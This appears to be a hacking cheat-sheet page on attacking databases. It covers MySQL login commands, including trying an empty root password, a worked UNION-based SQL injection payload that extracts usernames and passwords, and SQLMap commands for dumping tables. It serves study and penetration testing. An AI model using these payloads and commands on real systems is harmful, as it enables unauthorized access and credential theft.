# Exploit a Database

<hr class="sl">

## Random

Note: this isn't a course about SQL, but stuff that may be useful to hackers.

<div class="row row-cols-md-2"><div>

* `service xxx status`: check if a service is enabled. 
  * `mysql`
  * `postgresql`
  * `...`
* `mysql -u root -p -h <ip>`: login as root to the database at `<ip>`
  * Use `mysql -u root -p` for a local database.
  * Try an empty password, as this is the default password for root.
</div><div>

Inside the SQL console, you may use

* `source <sql>`: in MySQL console, import a SQL file.

Note that even if you can insert a path, you should start the SQL console inside the folder with the SQL file, and only enter the filename. This is because, if the file is importing data from other files, it less likely to still work if the statements are executed from another folder than the one with the script.

* `DESCRIBE <table>`: see the structure of `<table>`
</div></div>

<hr class="sr">

## SQL Injections

<div class="row row-cols-md-2"><div>

Most websites are using SQL database to store records. For instance, when using a login form, the username will most likely be used to fetch a user, then there will be a check of the password.

In some cases, SQL injections are possible. It means that instead of providing our username, we will provide some SQL code that will be injected in the SQL request, and allow a hacker to access the database via the login form.

**Example of injectable PHP code**: this code is fetching a list of products matching the product name send by the client.

```php
$sql = "Select name,desc from product where name LIKE '%$name%'";
```

If the user enter the following value instead of a product name

```php
' UNION Select username,password FROM users-- -
```

Then, the SQL query that will be executed will be

```sql
Select name,desc from product where name LIKE '%' UNION Select username,password FROM users-- -%'
```

Notice that now, the query will return a list of product, concatenated with a list of usernames/password!
</div><div>

**Explanation**

**Inject `'`**: because we want to close the "Like", and avoid an error `[...] LIKE '%`.

```sql
Select name,desc from product where name LIKE '%'%'
```

**1. Inject `' --`**: the problem, is that now the query won't work, because we have 3 single quotes, and there is a trailing `%`. So, what we do is commenting the rest of the query.

```sql
Select name,desc from product where name LIKE '%' --%'
```

**2. Inject `'-- -`**:  The code above may not work on some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add ` -`, to ensure that there is a space.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

**3. Have fun**: between `'%'` and `-- -%'`, we can write SQL code, through the syntax of the final query must be valid. In the example, we used `UNION Select username,password FROM users`, which is used to merge results of two queries.
</div></div>

<hr class="sl">

## SQLMap

<div class="row row-cols-md-2"><div>

From the [SQLMap GitHub Repository](https://github.com/sqlmapproject/sqlmap): "sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.".

Try injecting a form

```bash
# try login.php
sqlmap -u URL/login.php
```

Try dumping the table "users" in the database "db_name"

```bash
sqlmap -u UGL/login.php -D db_name -T users –dump
```

Notes

* Try both with, and without union tests
* `XXX xxx is vulnerable`: enter yes to try exploiting this parameter
</div><div>

* `-u URL`: try injecting this URL
* `--dbs`: display all databases
* `--tables`: display tables
* `--column`: display columns
* `-C xx, yy`: display only columns xx, and yy
* `--dbms=some_dbms`: provide dbms, increase the chances of success
* `-D db_name`: the name of the database
* `--time-sec timeout`: specify a timeout
* `--dump`: save current data
* `--dump-all`: save all data
* `--batch`: do all requests at once (do not way for input)

> [SQLMap CheatSheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet) (external)
</div></div>

> You can use **BurpSuite** with SQLMap. Once you intercepted a request, right-click on it, and use **Save item**. Then, in SQLMap, use `-r /path/to/your/saved/item`. If your antivirus is blocking SQLMap, it may bypass it.